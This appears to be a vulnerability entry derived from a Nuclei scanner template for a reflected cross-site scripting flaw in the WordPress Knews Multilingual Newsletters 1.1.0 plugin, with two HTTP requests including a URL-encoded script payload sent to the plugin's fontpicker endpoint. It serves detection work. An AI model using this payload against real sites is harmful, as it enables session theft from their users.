# Vulnerability: WordPress Knews Multilingual Newsletters 1.1.0 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-knews-xss.yaml`)

## Description
WordPress Knews Multilingual Newsletters 1.1.0 plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/knews/readme.txt HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/knews/wysiwyg/fontpicker/?ff=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

